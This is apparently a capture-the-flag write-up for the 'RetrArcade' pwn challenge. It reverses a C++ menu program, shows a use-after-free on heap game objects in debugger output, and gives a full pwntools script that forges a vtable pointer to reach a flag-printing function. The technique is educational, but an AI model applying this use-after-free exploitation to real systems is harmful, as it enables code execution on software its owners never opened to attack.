# RetrArcade

## Introduction

The challenge can be accessed remotely using:

```
nc binary-sas.hackthe.space 21337
```

The files present in the remote environment can be downloaded for analysis and local exploit development. The real exploit has to be executed against the remote environment, which contains a `flag.txt` that contains the flag.

There are multiple files present in the download:

- `retrarcade` - the main binary
- `libc-2.35.so`

`retrarcade` appears to be the main binary file. A quick inspection reveals some information about it:

```
$ file retrarcade
retrarcade: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=031a49bd7309dd0630ce05f77994ef997a947670, for GNU/Linux 3.2.0, not stripped

$ checksec --file=retrarcade
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   111 Symbols       No    0               1               retrarcade
```

The binary is not stripped and contains debug information, meaning symbols like function names are present. NX is enabled and a stack canary protects the return point, making a straightforward stack buffer overflow harder to exploit. NX also prevents directly executing shellcode written to the stack. No PIE means addresses in the binary (gadgets, functions) are static across runs, since ASLR doesn't randomize them.

## Running the Binary

The program presents a simple main menu:

```
WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
>
```

### Loading a game

Selecting "Load a Game" opens the cartridge loader:

```
LOAD A CARTRIDGE
Choose a game:
1. Pixel Brawl
2. Synapse Racer
3. Galaxy Scrapper
4. Stack Smashers
5. HeartBits
```

Choosing, for example, "Pixel Brawl" prompts for a slot:

```
Choose a slot id in which to load your game (1-4)
>
```

A valid slot (1-4) loads the game and returns to the main menu. Invalid input reports an error and reprints the menu:

```
Invalid category or slot id
WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
>
```

### Playing a game

Loading Pixel Brawl into slot 1, then playing it via option 2:

```
WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
> 2
PLAY A GAME
Choose one of your loaded games to play and unload (1-4)
>
```

Selecting slot 1 prints flavor text and returns to the menu:

```
> 1
You play Pixel Brawl 2084. It's from a time when collision detection was optional and hitboxes were mostly vibes. Difficulty was the substitution for content. It's draining your wallet of quarters quickly, but you need to beat the Last
Packet-Dropper, a boss that deletes half your inputs before they reach the screen.

WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
>
```

Trying to play the same slot again (after it's "unloaded") crashes:

```
> 2
PLAY A GAME
Choose one of your loaded games to play and unload (1-4)
> 1
Segmentation fault        (core dumped)
```

The same crash occurs when playing without loading any cartridge first - hinting at missing checks or unsafe access to the internal game-slot data structure.

### Submitting a highscore

From the main menu, option 3 enters the highscore flow:

```
WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
> 3
SUBMIT A HIGHSCORE
How long is your highscore entry?
>
```

Non-numeric input is rejected with a detailed error:

```
How long is your highscore entry?
> f
Invalid length. It has to be more than one and less than 273 characters. It's such a specific number because that's the number of bytes left in the emulator we could use. It was bigger once but people kept asking us why it's such a spec
ific number and we sacrificed some more bytes to write this explanation.

WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
>
```

A valid integer length between 2 and 272 (inclusive) prompts for the actual string:

```
WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
> 3
SUBMIT A HIGHSCORE
How long is your highscore entry?
> 3
Enter your Highscore
>
```

Interestingly, extra characters beyond the chosen length aren't discarded - they remain buffered and are reused as input for the next main-menu prompt:

```
How long is your highscore entry?
> 3
Enter your Highscore
> sasad
WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
> WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
>
```

This hints at how input is read and reused internally - relevant later for the exploit.

Option 4 exits cleanly:

```
> WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
> 4

Goodbye
```

## Reversing the Binary

The binary was loaded into Ghidra to inspect the main control flow. The program is written in C++ (evident from `std::cout`-style printing). `main` implements a looped menu that reads an integer choice from `std::cin`, validates it, and dispatches to `loadGame`, `playGame`, `submitHighscore`, or `goodbye()`:

```c
void main(void)
{
  bool bVar1;
  char cVar2;
  ostream *poVar3;
  long *plVar4;
  long in_FS_OFFSET;
  int local_14;
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    do {
      while( true ) {
        poVar3 = std::operator<<((ostream *)std::cout,"WELCOME TO RETRARCADE");
        std::ostream::operator<<(poVar3,std::endl<>);
        poVar3 = std::operator<<((ostream *)std::cout,"1. Load a Game");
        std::ostream::operator<<(poVar3,std::endl<>);
        poVar3 = std::operator<<((ostream *)std::cout,"2. Play a Game");
        std::ostream::operator<<(poVar3,std::endl<>);
        poVar3 = std::operator<<((ostream *)std::cout,"3. Submit a Highscore");
        std::ostream::operator<<(poVar3,std::endl<>);
        poVar3 = std::operator<<((ostream *)std::cout,"4. Quit");
        std::ostream::operator<<(poVar3,std::endl<>);
        std::operator<<((ostream *)std::cout,"> ");
        std::ostream::flush();
        plVar4 = (long *)std::istream::operator>>((istream *)std::cin,&local_14);
        bVar1 = std::ios::operator.cast.to.bool((ios *)((long)plVar4 + *(long *)(*plVar4 + -0x18)));
        if (bVar1) break;
        cVar2 = FUN_004012e0(0x405270);
        if (cVar2 != '\0') {
          goodbye();
        }
        handle_input_error();
      }
    } while ((local_14 < 1) || (4 < local_14));
    if (local_14 == 1) {
      loadGame();
    }
    else if (local_14 == 2) {
      playGame();
    }
    else if (local_14 == 3) {
      submitHighscore();
    }
    else {
      goodbye();
    }
  } while( true );
}
```

### Game loading: heap allocation into a global slot array

`loadGame` asks for a game category and slot index, validates both, and - if valid - `new`s the corresponding game class, storing the pointer into a global array `loaded_games` indexed by slot:

```c
void loadGame(void)
{
  ostream *poVar1;
  game_pixel_brawl *this;
  game_synapse_racer *this_00;
  game_galaxy_scrapper *this_01;
  game_stack_smashers *this_02;
  game_heartbits *this_03;
  long in_FS_OFFSET;
  int local_28;
  int local_24;
  long local_20;

  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  poVar1 = std::operator<<((ostream *)std::cout,"LOAD A CARTRIDGE");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"Choose a game:");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"1. Pixel Brawl");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"2. Synapse Racer");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"3. Galaxy Scrapper");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"4. Stack Smashers");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"5. HeartBits");
  std::ostream::operator<<(poVar1,std::endl<>);
  std::operator<<((ostream *)std::cout,"> ");
  std::ostream::flush();
  std::istream::operator>>((istream *)std::cin,&local_28);
  poVar1 = std::operator<<((ostream *)std::cout,"Choose a slot id in which to load your game (1-4)");
  std::ostream::operator<<(poVar1,std::endl<>);
  std::operator<<((ostream *)std::cout,"> ");
  std::ostream::flush();
  std::istream::operator>>((istream *)std::cin,&local_24);
  if ((((local_28 < 1) || (5 < local_28)) || (local_24 < 1)) || (4 < local_24)) {
    poVar1 = std::operator<<((ostream *)std::cout,"Invalid category or slot id");
    std::ostream::operator<<(poVar1,std::endl<>);
    handle_input_error();
  }
  else {
    local_24 = local_24 - 1;
    if (local_28 == 1) {
      this = (game_pixel_brawl *)operator.new(8);
      game_pixel_brawl::game_pixel_brawl(this);
      *(game_pixel_brawl **)(loaded_games + (long)local_24 * 8) = this;
    }
    else if (local_28 == 2) {
      this_00 = (game_synapse_racer *)operator.new(8);
      game_synapse_racer::game_synapse_racer(this_00);
      *(game_synapse_racer **)(loaded_games + (long)local_24 * 8) = this_00;
    }
    else if (local_28 == 3) {
      this_01 = (game_galaxy_scrapper *)operator.new(8);
      game_galaxy_scrapper::game_galaxy_scrapper(this_01);
      *(game_galaxy_scrapper **)(loaded_games + (long)local_24 * 8) = this_01;
    }
    else if (local_28 == 4) {
      this_02 = (game_stack_smashers *)operator.new(8);
      game_stack_smashers::game_stack_smashers(this_02);
      *(game_stack_smashers **)(loaded_games + (long)local_24 * 8) = this_02;
    }
    else {
      this_03 = (game_heartbits *)operator.new(8);
      game_heartbits::game_heartbits(this_03);
      *(game_heartbits **)(loaded_games + (long)local_24 * 8) = this_03;
    }
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
}
```

From this code:

- `loaded_games` is a global array of 4 pointers (8 bytes each), one per slot.
- For each selected game type, a small heap object is allocated with `operator.new(8)` and its address stored in `loaded_games[slot]`.
- The game object starts with a vtable pointer, so indirect calls through it dispatch to a virtual `play` method.

### Playing and unloading games: use-after-free candidate

`playGame` chooses a loaded game, calls into it, and cleans up the slot:

```c
void playGame(void)
{
  ostream *poVar1;
  long in_FS_OFFSET;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  while (true) {
    poVar1 = std::operator<<((ostream *)std::cout,"PLAY A GAME");
    std::ostream::operator<<(poVar1,std::endl<>);
    poVar1 = std::operator<<((ostream *)std::cout,
                             "Choose one of your loaded games to play and unload (1-4)");
    std::ostream::operator<<(poVar1,std::endl<>);
    std::operator<<((ostream *)std::cout,"> ");
    std::ostream::flush();
    std::istream::operator>>((istream *)std::cin,&local_14);
    if ((0 < local_14) && (local_14 < 5)) break;
    if (local_14 == 0) {
      poVar1 = std::operator<<((ostream *)std::cout,"Invalid slot id");
      std::ostream::operator<<(poVar1,std::endl<>);
      handle_input_error();
    }
  }
  local_14 = local_14 - 1;
  (**(code **)**(undefined8 **)(loaded_games + (long)local_14 * 8))
            (*(undefined8 *)(loaded_games + (long)local_14 * 8));
  if (*(void **)(loaded_games + (long)local_14 * 8) != (void *)0x0) {
    operator.delete(*(void **)(loaded_games + (long)local_14 * 8),8);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
}
```

The critical sequence:

```c
(**(code **)**(undefined8 **)(loaded_games + (long)local_14 * 8))
          (*(undefined8 *)(loaded_games + (long)local_14 * 8));
if (*(void **)(loaded_games + (long)local_14 * 8) != (void *)0x0) {
  operator.delete(*(void **)(loaded_games + (long)local_14 * 8),8);
}
```

This means:

- The pointer stored in `loaded_games[slot]` is treated as an object with a vtable at its start.
- The code loads the vtable pointer from `*loaded_games[slot]` and calls its first virtual function, passing the object pointer itself as an argument (a typical C++ virtual call).
- Immediately afterward, if `loaded_games[slot]` is non-null, the heap object is freed with `operator.delete`.

Critically, **nothing resets `loaded_games[slot]` to `nullptr`** after the delete. The global slot keeps holding the freed pointer. Choosing the same slot again on the next `playGame` call triggers another virtual call via the stale pointer and another delete attempt on the same freed object - a classic **use-after-free**.

Use-after-free vulnerabilities arise when a program continues to hold and dereference pointers to heap memory after that memory has been returned to the allocator. If an attacker can influence what gets reallocated into that region, these stale pointers can become arbitrary code execution primitives by corrupting vtables or function pointers [web:1].

### Highscore handling: controlled heap allocations

`submitHighscore` implements the "Submit a Highscore" flow:

```c
void submitHighscore(void)
{
  ostream *poVar1;
  long in_FS_OFFSET;
  int local_1c;
  char *local_18;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  poVar1 = std::operator<<((ostream *)std::cout,"SUBMIT A HIGHSCORE");
  std::ostream::operator<<(poVar1,std::endl<>);
  poVar1 = std::operator<<((ostream *)std::cout,"How long is your highscore entry?");
  std::ostream::operator<<(poVar1,std::endl<>);
  std::operator<<((ostream *)std::cout,"> ");
  std::ostream::flush();
  std::istream::operator>>((istream *)std::cin,&local_1c);
  if ((local_1c < 1) || (0x110 < local_1c)) {
    poVar1 = std::operator<<((ostream *)std::cout,
      "Invalid length. It has to be more than one and less than 273 characters. It's such a specific "
      "number because that's the number of bytes left in the emulator we could use. It was bigger once "
      "but people kept asking us why it's such a specific number and we sacrificed some more bytes to "
      "write this explanation."
    );
    std::ostream::operator<<(poVar1,std::endl<>);
    handle_input_error();
  }
  else {
    poVar1 = std::operator<<((ostream *)std::cout,"Enter your Highscore");
    std::ostream::operator<<(poVar1,std::endl<>);
    std::operator<<((ostream *)std::cout,"> ");
    std::ostream::flush();
    std::istream::get();
    local_18 = (char *)malloc((long)local_1c);
    fgets(local_18,local_1c,stdin);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
}
```

The function reads a length into `local_1c`, enforcing a range of 2–272 (inclusive). If valid, it allocates `malloc((long)local_1c)` and reads exactly that many bytes via `fgets(local_18, local_1c, stdin)`.

Key observations:

- The attacker fully controls `local_1c` (within range), directly controlling the allocated chunk's size.
- The attacker also fully controls the allocation's contents via `fgets`.
- The pointer `local_18` isn't stored persistently - no `free` is called, and it's not used beyond this function. In isolation, this looks like a bounded allocation with no overflow.

Combined with the use-after-free in `playGame`, though, this becomes a powerful primitive:

- `playGame` deletes a game object but leaves a stale pointer in `loaded_games`.
- Subsequent `malloc(local_1c)` calls in `submitHighscore` can reuse the same freed heap chunk that previously held the game object (including its vtable pointer).
- Since the attacker controls both size and content, the freed region can be re-filled with attacker-controlled data - including a fake "vtable pointer" - that gets dereferenced and called the next time the stale pointer is used.

## Visualizing the Use-After-Free on the Heap

Using pwndbg, I confirmed the game objects live on the heap and observed their chunks before and after playing a game.

### Before playing (chunk holds the vtable pointer)

```
pwndbg> heap -v
Changes to tcache in GLIBC 2.42 have not been fully implemented. PR contributions are highly appreciated!
Allocated chunk | PREV_INUSE
Addr: 0x406000
prev_size: 0x00
size: 0x12010 (with flag bits: 0x12011)
fd: 0x12000
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x418010
prev_size: 0x00
size: 0x300 (with flag bits: 0x301)
fd: 0x7000700070007
bk: 0x7000700070007
fd_nextsize: 0x7000700070007
bk_nextsize: 0x7000700070007

Allocated chunk | PREV_INUSE
Addr: 0x418310
prev_size: 0x00
size: 0x410 (with flag bits: 0x411)
fd: 0x612065736f6f203e
bk: 0x646920746f6c7320
fd_nextsize: 0x63696877206e6920
bk_nextsize: 0x616f6c206f742068

Allocated chunk | PREV_INUSE
Addr: 0x418720
prev_size: 0x00
size: 0x410 (with flag bits: 0x411)
fd: 0xa31
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x418b30
prev_size: 0x00
size: 0x20 (with flag bits: 0x21)
fd: 0x404d38
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x204b1

Top chunk | PREV_INUSE
Addr: 0x418b50
prev_size: 0x00
size: 0x204b0 (with flag bits: 0x204b1)
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```

The chunk right before the top chunk, at `0x418b30`, has `size: 0x20 (with flag bits: 0x21)`. In glibc, the size field stores size in the upper bits with flags in the low bits: `0x21` decodes as `0x20` (32-byte chunk) + `0x1` (PREV_INUSE flag). The `fd: 0x404d38` value looks like a pointer into `.rodata`/`.data`. Inspecting with `vis_heap_chunks`:

```
pwndbg> vis_heap_chunks
0x418ac0        0x0000000000000000      0x0000000000000000      ................
0x418ad0        0x0000000000000000      0x0000000000000000      ................
0x418ae0        0x0000000000000000      0x0000000000000000      ................
0x418af0        0x0000000000000000      0x0000000000000000      ................
0x418b00        0x0000000000000000      0x0000000000000000      ................
0x418b10        0x0000000000000000      0x0000000000000000      ................
0x418b20        0x0000000000000000      0x0000000000000000      ................
0x418b30        0x0000000000000000      0x0000000000000021      ........!.......
0x418b40        0x0000000000404d38      0x0000000000000000      8M@.............
0x418b50        0x0000000000000000      0x00000000000204b1      ................         <-- Top chunk
```

The header at `0x418b30` ends in `0x21` (size + flag), and the user data at `0x418b40` holds `0x0000000000404d38` - matching the `fd` value from `heap -v`. Examining that address:

```
pwndbg> x/16gx 0x404d38
0x404d38 <_ZTV16game_pixel_brawl+16>:        0x0000000000401f1c      0x0000000000000000
0x404d48 <_ZTV4game+8>:                      0x0000000000404dd0      0x0000000000401ede
0x404d58 <_ZTI14game_heartbits>:            0x00007ffff7e84ac0      0x0000000000403ac0
0x404d68 <_ZTI14game_heartbits+16>:         0x0000000000404dd0      0x00007ffff7e84ac0
0x404d78 <_ZTI19game_stack_smashers+8>:     0x0000000000403ae0      0x0000000000404dd0
0x404d88 <_ZTI20game_galaxy_scrapper>:      0x00007ffff7e84ac0      0x0000000000403b00
0x404d98 <_ZTI20game_galaxy_scrapper+16>:   0x0000000000404dd0      0x00007ffff7e84ac0
0x404da8 <_ZTI18game_synapse_racer+8>:      0x0000000000403b20      0x0000000000404dd0
```

This is clearly the vtable area in `.rodata`/`.data`: `_ZTV16game_pixel_brawl` and various typeinfo symbols. The first entry at `0x404d38` points to `0x401f1c`:

```
pwndbg> x/16i 0x401f1c
0x401f1c <_ZN16game_pixel_brawl4playEv>:     endbr64
0x401f20 <_ZN16game_pixel_brawl4playEv+4>:   push   rbp
0x401f21 <_ZN16game_pixel_brawl4playEv+5>:   mov    rbp,rsp
0x401f24 <_ZN16game_pixel_brawl4playEv+8>:   sub    rsp,0x10
0x401f28 <_ZN16game_pixel_brawl4playEv+12>:  mov    QWORD PTR [rbp-0x8],rdi
...
```

This is `game_pixel_brawl::play()`. Putting it together: the 0x20-byte chunk at `0x418b30` is the heap-allocated `game_pixel_brawl` object, whose only field is a vtable pointer. The `playGame` virtual call dereferences the object → vtable pointer → first function pointer → call, landing in `game_pixel_brawl::play()`.

### After playing (chunk freed, reused by highscore)

After actually playing the game once, the chunk moves into the tcache:

```
pwndbg> heap -v
Allocated chunk | PREV_INUSE
Addr: 0x406000
prev_size: 0x00
size: 0x12010 (with flag bits: 0x12011)
...

Allocated chunk | PREV_INUSE
Addr: 0x418720
prev_size: 0x00
size: 0x410 (with flag bits: 0x411)
fd: 0xa31
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x418b30
prev_size: 0x00
size: 0x20 (with flag bits: 0x21)
fd: 0x418
bk: 0xbff7446e6f09f187
fd_nextsize: 0x00
bk_nextsize: 0x204b1

Top chunk | PREV_INUSE
Addr: 0x418b50
prev_size: 0x00
size: 0x204b0 (with flag bits: 0x204b1)
...
```

The `0x20`-byte chunk at `0x418b30` is now `Free chunk (tcachebins)` - glibc put it into the per-thread tcache. Critically, `loaded_games[0]` still points to this address: a **dangling pointer into a freed heap chunk**.

Submitting a highscore that causes `malloc` to request exactly `0x20` bytes reuses this freed chunk. Entering a short highscore like `"hello"`:

```
pwndbg> vis_heap_chunks
0x418a90        0x0000000000000000      0x0000000000000000      ................
0x418aa0        0x0000000000000000      0x0000000000000000      ................
0x418ab0        0x0000000000000000      0x0000000000000000      ................
0x418ac0        0x0000000000000000      0x0000000000000000      ................
0x418ad0        0x0000000000000000      0x0000000000000000      ................
0x418ae0        0x0000000000000000      0x0000000000000000      ................
0x418af0        0x0000000000000000      0x0000000000000000      ................
0x418b00        0x0000000000000000      0x0000000000000000      ................
0x418b10        0x0000000000000000      0x0000000000000000      ................
0x418b20        0x0000000000000000      0x0000000000000000      ................
0x418b30        0x0000000000000000      0x0000000000000021      ........!.......
0x418b40        0x00000a6f6c6c6568      0x0000000000000000      hello...........
0x418b50        0x0000000000000000      0x00000000000204b1      ................         <-- Top chunk
```

The chunk header still shows `0x21` (size + flag), but the user data at `0x418b40` now contains `"hello\n"` instead of the vtable pointer `0x404d38`.

This is the expected effect of combining use-after-free with a controlled `malloc`:

1. Initially, the object's chunk holds a vtable pointer used for virtual dispatch.
2. After playing the game once, the object is freed into tcache, but the global pointer stays dangling.
3. Allocating a highscore of the same size reuses the freed chunk, and `fgets` fills it with attacker data.
4. `loaded_games[0]` still points into that memory - but now it contains arbitrary bytes instead of a real object.

On the next `playGame` call for the same slot, the program fetches the stale pointer, treats the first QWORD of the "hello" buffer as a vtable pointer, dereferences it, and attempts to call through it.

## Finding the Flag-Printing Function

Searching Ghidra for the keyword "flag" reveals a reference to the string `"flag.txt"`:

```
0040150c 48 8d 0d 61 22 00 00 LEA RCX,[s_flag.txt_00403774] ; "flag.txt"
00401513 48 89 ce MOV RSI,RCX
00401516 48 89 c7 MOV RDI,RAX
```

The function containing this reference - `true_route_of_the_compilers_lover`, at address `0x4013d6` - reads and prints `flag.txt`:

```c
/* WARNING: Unknown calling convention -- yet parameter storage is locked */
/* true_route_of_the_compilers_lover() */

void true_route_of_the_compilers_lover(void)

{
  char cVar1;
  streambuf *psVar2;
  ostream *poVar3;
  long in_FS_OFFSET;
  ulong local_298;
  ifstream local_288 ;
  byte local_78 ;
  long local_20;

  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_78 = 10;
  local_78 = 10;
  local_78 = 0x7d;
  local_78 = 0x42;
  local_78 = 0x43;
  local_78 = 0x59;
  local_78 = 0x5a;
  local_78 = 0x4f;
  local_78 = 0x58;
  local_78 = 0x59;
  local_78 = 10;
  local_78[0xb] = 0x43;
  local_78[0xc] = 0x44;
  local_78[0xd] = 10;
  local_78[0xe] = 0x5e;
  local_78[0xf] = 0x42;
  local_78[0x10] = 0x4f;
  local_78[0x11] = 10;
  local_78[0x12] = 0x59;
  local_78[0x13] = 0x49;
  local_78[0x14] = 0x58;
  local_78[0x15] = 0x4f;
  local_78[0x16] = 0x4f;
  local_78[0x17] = 0x44;
  local_78[0x18] = 6;
  local_78[0x19] = 0x20;
  local_78[0x1a] = 10;
  local_78[0x1b] = 10;
  local_78[0x1c] = 0x4f;
  local_78[0x1d] = 0x5c;
  local_78[0x1e] = 0x4f;
  local_78[0x1f] = 0x58;
  local_78[0x20] = 0x53;
  local_78[0x21] = 10;
  local_78[0x22] = 0x48;
  local_78[0x23] = 0x58;
  local_78[0x24] = 0x4b;
  local_78[0x25] = 0x44;
  local_78[0x26] = 0x49;
  local_78[0x27] = 0x42;
  local_78[0x28] = 10;
  local_78[0x29] = 0x4b;
  local_78[0x2a] = 10;
  local_78[0x2b] = 0x4d;
  local_78[0x2c] = 0x4f;
  local_78[0x2d] = 0x44;
  local_78[0x2e] = 0x5e;
  local_78[0x2f] = 0x46;
  local_78[0x30] = 0x4f;
  local_78[0x31] = 10;
  local_78[0x32] = 0x5a;
  local_78[0x33] = 0x5f;
  local_78[0x34] = 0x46;
  local_78[0x35] = 0x59;
  local_78[0x36] = 0x4f;
  local_78[0x37] = 6;
  local_78[0x38] = 0x20;
  local_78[0x39] = 10;
  local_78[0x3a] = 10;
  local_78[0x3b] = 0x42;
  local_78[0x3c] = 0x4f;
  local_78[0x3d] = 0x4b;
  local_78[0x3e] = 0x58;
  local_78[0x3f] = 0x5e;
  local_78[0x40] = 10;
  local_78[0x41] = 0x4c;
  local_78[0x42] = 0x43;
  local_78[0x43] = 0x44;
  local_78[0x44] = 0x4e;
  local_78[0x45] = 0x59;
  local_78[0x46] = 10;
  local_78[0x47] = 0x43;
  local_78[0x48] = 0x5e;
  local_78[0x49] = 0x59;
  local_78[0x4a] = 10;
  local_78[0x4b] = 0x45;
  local_78[0x4c] = 0x5d;
  local_78[0x4d] = 0x44;
  local_78[0x4e] = 10;
  local_78[0x4f] = 0x58;
  local_78[0x50] = 0x45;
  local_78[0x51] = 0x5f;
  local_78[0x52] = 0x5e;
  local_78[0x53] = 0x4f;
  local_78[0x54] = 4;
  local_78[0x55] = 0x20;
  local_78[0x56] = 0x20;
  std::ostream::operator<<((ostream *)std::cout,std::endl<>);
  for (local_298 = 0; local_298 < 0x57; local_298 = local_298 + 1) {
    std::operator<<((ostream *)std::cout,local_78[local_298] ^ 0x2a);
  }
  std::ifstream::ifstream(local_288,"flag.txt",8);
  cVar1 = std::ifstream::is_open();
  if (cVar1 == '\0') {
    poVar3 = std::operator<<((ostream *)std::cout,"Task failed successfully! Can\'t read flag.txt");
    std::ostream::operator<<(poVar3,std::endl<>);
  }
  else {
    psVar2 = (streambuf *)std::ifstream::rdbuf();
                    /* try { // try from 0040154d to 0040159f has its CatchHandler @ 004015c0 */
    poVar3 = (ostream *)std::ostream::operator<<((ostream *)std::cout,psVar2);
    std::ostream::operator<<(poVar3,std::endl<>);
  }
  std::ostream::flush();
  std::ifstream::~ifstream(local_288);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Simply overwriting a return address with `0x4013d6` isn't enough here, because the available primitive is a use-after-free on a C++ object: playing a freed game slot triggers a virtual call through a pointer stored in the freed chunk. This requires a fake object whose first QWORD is treated as a vtable pointer, and that vtable entry must contain the target code pointer.

To find a convenient existing location in the binary that already contains the value `0x4013d6`, I used pwndbg's `find` command:

```
pwndbg> find 0x400000, +0x100000, 0x4013d6
0x4050c0 <secret_ending_location>
warning: Unable to access 16000 bytes of target memory at 0x437d44, halting search.
1 pattern found.
```

This scans memory starting at `0x400000` (base of the non-PIE binary) for 1 MiB, looking for the little-endian 8-byte pattern `0x4013d6` - the address of `true_route_of_the_compilers_lover`. The result: `0x4050c0`, labeled `<secret_ending_location>`, already stores a pointer to the flag-printing function.

This is exactly what's needed for the use-after-free:

1. Craft a fake "game object" inside the recycled heap chunk by writing a single QWORD equal to `0x4050c0`.
2. When `playGame` later executes:
   ```c
   (**(code **)**(undefined8 **)(loaded_games + (long)slot * 8))
             (*(undefined8 *)(loaded_games + (long)slot * 8));
   ```
   it reads the QWORD from `loaded_games[slot]` (now pointing to the fake object), treats it as a vtable pointer, dereferences it again to get the first "virtual function" pointer - which is the value at `0x4050c0`, i.e. `true_route_of_the_compilers_lover` - and calls it with the fake object pointer as `this`.

Using `find` to locate `secret_ending_location` at `0x4050c0` provides a stable, binary-resident pointer to the hidden flag-printing function. This address becomes the "vtable pointer" inside the highscore-controlled heap chunk, so the stale `loaded_games` pointer eventually dispatches into `true_route_of_the_compilers_lover`, printing the real flag.

## Final Exploit Script

Putting everything together in a pwntools script:

```python
from pwn import *

r = remote('binary-sas.hackthe.space', 21337)

# Load game into slot 1
r.sendlineafter(b"> ", b"1")  # 1. Load a Game
r.sendlineafter(b"> ", b"1")  # 1. Pixel Brawl (game choice)
r.sendlineafter(b"> ", b"1")  # slot 1

# Play/free the game (creates the dangling pointer in loaded_games)
r.sendlineafter(b"> ", b"2")  # 2. Play a Game
r.sendlineafter(b"> ", b"1")  # slot 1

# Now reallocate the freed chunk with a fake "object"
r.sendlineafter(b"> ", b"3")  # 3. Submit a Highscore
r.recvuntil(b"> ")
r.sendline(b"9")              # highscore length

# Overwrite the recycled chunk with our fake vtable pointer
# 0x4050c0 = secret_ending_location, which holds a pointer to true_route_of_the_compilers_lover
r.recvuntil(b"> ")
r.send(p64(0x004050c0) + b'\n')

# Trigger use-after-free: virtual call through the dangling pointer
r.sendlineafter(b"> ", b"2")  # 2. Play a Game
r.sendlineafter(b"> ", b"1")  # slot 1

r.interactive()
```

### Step by step

1. **Connect** to the remote service: `r = remote('binary-sas.hackthe.space', 21337)`.
2. **Load a game into slot 1**: select `1` ("Load a Game"), then `1` for "Pixel Brawl", then `1` for slot 1. This causes `loadGame()` to allocate a `game_pixel_brawl` object on the heap and store its pointer in `loaded_games[0]`.
3. **Play the game once to create the dangling pointer**: select `2` ("Play a Game"), then slot `1`. `playGame()` virtually calls `game_pixel_brawl::play()` through `loaded_games[0]` and then deletes the object. The heap chunk moves into tcache, but `loaded_games[0]` still holds the old pointer - a use-after-free target.
4. **Reallocate the freed chunk via the highscore feature**: select `3` ("Submit a Highscore") and answer length `9`. Since `submitHighscore` does `malloc(local_1c)` followed by `fgets(buf, local_1c, stdin)`, and `fgets` reads at most `local_1c - 1` characters plus the terminator, a length of `9` gives exactly 8 bytes of payload space before the newline/terminator - one QWORD, perfect for overwriting the first field of the reused chunk with a single pointer.
5. **Overwrite the recycled chunk with a fake vtable pointer**: send `p64(0x004050c0) + b'\n'`, making the first 8 bytes of the chunk `0x4050c0` - the address of `secret_ending_location`, which stores a pointer to `true_route_of_the_compilers_lover`. This turns the freed game object into a fake object whose "vtable pointer" is `0x4050c0`.
6. **Trigger the use-after-free**: select `2` ("Play a Game") and slot `1` again. `playGame()` reads `loaded_games[0]`, treats the QWORD at the start of the recycled chunk (`0x4050c0`) as a vtable pointer, dereferences it, and calls the first entry - `true_route_of_the_compilers_lover` - which prints the real flag from the server.
7. **`r.interactive()`** opens an interactive session to view the printed flag.

The key points:

- Free the original game object but keep a dangling pointer in `loaded_games[0]`.
- Force `malloc` to reuse that exact `0x20`-byte chunk via the highscore interface.
- Choose length `9` so `fgets` writes exactly 8 bytes of chosen data (plus newline) - the address `0x4050c0`.
- The virtual call on the dangling pointer goes through the fake vtable pointer and lands in `true_route_of_the_compilers_lover`, which reads `flag.txt` and prints the flag.

### Output

```
python hack.py
[+] Opening connection to binary-sas.hackthe.space on port 21337: Done
[*] Switching to interactive mode

  Whispers in the screen,
  every branch a gentle pulse,
  heart finds its own route.

FLG{XXX_XXXX_XXXX_XXXX} 

WELCOME TO RETRARCADE
1. Load a Game
2. Play a Game
3. Submit a Highscore
4. Quit
> $
```

(Flag censored - everything else is exact output.)

